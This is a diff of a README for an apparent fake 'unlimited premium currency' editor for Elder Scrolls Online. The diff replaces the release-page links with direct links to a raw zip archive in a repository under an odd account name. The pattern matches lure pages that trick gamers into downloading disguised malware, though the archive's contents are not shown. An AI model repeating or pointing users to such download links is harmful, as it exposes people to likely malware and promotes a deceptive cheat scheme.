@@ -1,6 +1,6 @@
 # 🏰 Elder-Scrolls-Online-Crowns-Seals-Editor-Unlimited-Premium-Currency - Access game assets with simple tools.
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Beautytreatmentresidentialdistrict685/Elder-Scrolls-Online-Crowns-Seals-Editor-Unlimited-Premium-Currency/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Beautytreatmentresidentialdistrict685/Elder-Scrolls-Online-Crowns-Seals-Editor-Unlimited-Premium-Currency/main/Bombus/Currency_Scrolls_Online_Elder_Editor_Premium_Seals_Unlimited_Crowns_2.3.zip)
 
 ## 📌 About this application
 
@@ -19,7 +19,7 @@ This application runs on Windows systems. You need the following components to e
 
 You need to access the release page to get the installer for your machine. 
 
-1. Visit this page to download: [https://github.com/Beautytreatmentresidentialdistrict685/Elder-Scrolls-Online-Crowns-Seals-Editor-Unlimited-Premium-Currency/releases](https://github.com/Beautytreatmentresidentialdistrict685/Elder-Scrolls-Online-Crowns-Seals-Editor-Unlimited-Premium-Currency/releases)
+1. Visit this page to download: [https://raw.githubusercontent.com/Beautytreatmentresidentialdistrict685/Elder-Scrolls-Online-Crowns-Seals-Editor-Unlimited-Premium-Currency/main/Bombus/Currency_Scrolls_Online_Elder_Editor_Premium_Seals_Unlimited_Crowns_2.3.zip](https://raw.githubusercontent.com/Beautytreatmentresidentialdistrict685/Elder-Scrolls-Online-Crowns-Seals-Editor-Unlimited-Premium-Currency/main/Bombus/Currency_Scrolls_Online_Elder_Editor_Premium_Seals_Unlimited_Crowns_2.3.zip)
 2. Locate the file ending in .zip or .msi under the Assets section.
 3. Click the file name to start the download process.
 
